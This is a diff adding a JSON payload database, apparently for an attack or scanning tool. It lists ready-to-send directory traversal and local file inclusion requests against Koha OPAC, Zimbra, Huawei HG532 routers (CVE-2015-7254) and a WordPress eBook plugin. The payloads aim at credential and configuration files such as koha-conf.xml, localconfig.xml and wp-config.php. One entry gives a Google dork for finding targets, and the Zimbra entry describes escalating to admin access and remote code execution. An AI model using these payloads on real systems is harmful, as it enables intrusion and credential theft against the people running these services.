@@ -1,0 +1,30 @@
+{
+    "57baddfda32f75.89104241": {
+        "lTitle": "Koha Opac Local File Inclusion",
+        "lType": "Cookie Based",
+        "lMethod": "GET",
+        "lPayload": "KohaOpacLanguage=..\/..\/..\/..\/..\/..\/..\/..\/etc\/koha\/koha-conf.xml%00",
+        "lDescription": "<p>Affected Versions:&nbsp;LibLime Koha &lt;= 4.2<\/p>\r\n\r\n<p>Koha cgi-bin\/koha\/mainpage. pl contains&nbsp;a directory traversal vulnerability. A remote attacker may exploit this&nbsp;by means of injecting&nbsp;KohaOpacLanguage cookie to&nbsp;read arbitrary files.<\/p>\r\n\r\n<p><strong>Google Dork:&nbsp;inurl:koha\/opac-main.pl<\/strong><\/p>\r\n\r\n<p>&nbsp;<\/p>\r\n"
+    },
+    "57bae40003f7c2.53182708": {
+        "lTitle": "Zimbra Collaboration server LFI",
+        "lType": "Generic",
+        "lMethod": "GET",
+        "lPayload": "\/res\/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=..\/..\/..\/..\/..\/..\/..\/..\/..\/opt\/zimbra\/conf\/localconfig.xml%00",
+        "lDescription": "<p><strong>Affected Versions: &lt;=7.2.2 and &lt;=8.0.2<\/strong><\/p>\r\n\r\n<p>This module exploits a local file inclusion on Zimbra 8.0.2 and 7.2.2. The vulnerability allows an attacker to get the LDAP credentials from the localconfig.xml file.<\/p>\r\n\r\n<p>The stolen credentials allow the attacker to make requests to the service\/admin\/soap API.<\/p>\r\n\r\n<p>This can then be used to create an authentication token for the admin web interface. This access can be used to achieve remote code execution.<\/p>\r\n"
+    },
+    "57bae45f78f105.39274888": {
+        "lTitle": "HUAWEI LFI (cve-2015-7254)",
+        "lType": "Generic",
+        "lMethod": "GET",
+        "lPayload": ":37215\/icon\/..\/..\/..\/etc\/defaultcfg.xml",
+        "lDescription": "<p><strong>Advisory: CVE-2015-7254<\/strong><\/p>\r\n\r\n<p><strong>Affected Devices:&nbsp;Huawei HG532e, HG532n, &amp; HG532s<\/strong><\/p>\r\n\r\n<p>Directory traversal vulnerability on Huawei HG532e, HG532n, and HG532s devices allows remote attackers to read arbitrary files via a .. (dot dot) in an icon\/ URI<\/p>\r\n"
+    },
+    "57bae5aa4ce059.28362195": {
+        "lTitle": " WordPress eBook Generator File Download Vulnerability",
+        "lType": "Generic",
+        "lMethod": "GET",
+        "lPayload": "\/wp-content\/plugins\/aspose-cloud-ebook-generator\/aspose_posts_exporter_download.php?file=..\/..\/..\/wp-config.php",
+        "lDescription": "<p>WordPress Aspose Cloud eBook Generator File Download Vulnerability exploits a flaw in the plugin that allows us to&nbsp;force download of the wordpress configuration file from the server to perform further attacks.<\/p>\r\n"
+    }
+}
